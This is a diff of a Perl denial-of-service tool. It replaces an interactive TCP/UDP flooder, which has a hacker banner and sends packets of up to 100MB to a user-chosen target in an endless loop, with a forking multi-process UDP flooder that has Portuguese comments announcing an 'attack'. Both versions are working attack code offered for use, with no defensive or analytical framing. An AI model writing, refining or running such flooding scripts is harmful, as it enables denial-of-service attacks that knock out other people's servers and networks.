@@ -1,99 +1,44 @@
 #!/usr/bin/perl
+
+use strict;
+use warnings;
 use IO::Socket;
-use Scalar::Util qw(looks_like_number);
+use POSIX ':sys_wait_h';
 
-system("cls || clear");
+# CONFIGURAÇÕES ===========================
+my $target_ip = $ARGV[0] || die "Uso: perl udp_flood.pl <IP> <PORTA> <THREADS>\n";
+my $port = $ARGV[1] || 80;
+my $threads = $ARGV[2] || 10;
 
-print q{ 
-                   .-"      "-.  
-                  /            \ 
-                 |     Zix   | 
-                 |,  .-.  .-.  ,| 
-                 | )(__/  \__)( | 
-                 |/     /\     \| 
-       (@_       (_     ^^     _) 
-  _     ) \_______\__|IIIIII|__/__________________________ 
- (_)@8@8{}<________|-\IIIIII/-|_O_M_A_I_S_B_R_A_B_O_k_k_j_> 
-        )_/        \          / 
-       (@           `--------` Salve! 
+my $payload = "X" x 1024; # Pacote de 1KB
+# =========================================
 
- [---]   by:> Zix The Redencion   [---]
-};
+print "[*] Iniciando ataque em $target_ip:$port com $threads processos...\n";
 
-# Check Internet Connection
-my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com', 'PeerPort'=>80, 'Timeout'=>2, 'proto'=>'tcp');
-if (!(defined $check && $check)) {
-    print("[-] Internet Status[ Not Connected ]");
-    print("\n[!] Error: Please Check Your Internet Connection !!!");
-    exit(1);
-}
-$check->close();
-
-print "\n===============================";
-print "\n[~] Enter TargetIP: ";
-$host = <STDIN>;
-chomp($host);
-while ($host eq "") {
-    print "   [!] Enter TargetIP?: ";
-    $host = <STDIN>;
-    chomp($host);
-}
-print "TARGET ==> $host";
-
-print "\n===============================";
-print "\n[~] Enter Port: ";
-$port = <STDIN>;
-chomp($port);
-while ($port eq "" || !looks_like_number($port) || !grep { $port eq $_ } (0..65535)) {
-    print "   [!] Enter PORT?: ";
-    $port = <STDIN>;
-    chomp($port);
-}
-print "PORT ==> $port";
-
-print "\n===============================";
-print "\n[~] Enter Protocol (TCP or UDP): ";
-$proto = <STDIN>;
-chomp($proto);
-while ($proto eq "" || !grep { lc($proto) eq lc($_) } ('TCP','UDP')) {
-    print "   [!] Enter Protocol (TCP or UDP) ?: ";
-    $proto = <STDIN>;
-    chomp($proto);
-}
-print "Protocol ==> $proto";
-print "\n===============================\n";
-sleep(1);
-
-$sock = IO::Socket::INET->new(
-    PeerAddr => $host,
-    PeerPort => $port,
-    Proto    => "$proto"
-) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
-
-system("clear || cls");
-print "\n[*] Attack Started on [$host:$port] proto => [$proto]...\n\n";
-sleep(1);
-
-while (1) {
-    if (lc($proto) eq 'tcp') {
-        $sock = IO::Socket::INET->new(
-            PeerAddr => $host,
-            PeerPort => $port,
-            Proto    => "$proto"
-        ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n";
-
-        for ($i = 0; $i <= 500; $i++) {
-            my $size = int(rand(1024 * 1024 * 100)); # até 100MB
-            print ("Flooding: (=>$host:$port~$proto<=) Packet size: $size bytes\n");
-            my $data = 'A' x $size;
-            send($sock, $data, 0);
-        }
-
-    } else {
-        my $size = int(rand(1024 * 1024 * 100)); # até 100MB
-        print ("Flooding: (=>$host:$port~$proto<=) Packet size: $size bytes\n");
-        my $data = 'A' x $size;
-        send($sock, $data, 0);
+for (1 .. $threads) {
+    my $pid = fork();
+    if ($pid == 0) {
+        flood();
+        exit(0);
     }
 }
-$sock->close();
+
+# Espera processos filhos (não obrigatório, mas evita zumbis)
+$SIG{CHLD} = sub { while (waitpid(-1, WNOHANG) > 0) {} };
+
+sub flood {
+    while (1) {
+        my $sock = IO::Socket::INET->new(
+            PeerAddr => $target_ip,
+            PeerPort => $port,
+            Proto    => 'udp'
+        );
+
+        if ($sock) {
+            send($sock, $payload, 0);
+            print "[+] Pacote enviado para $target_ip:$port\n";
+        }
+
+        close($sock) if $sock;
+    }
+}
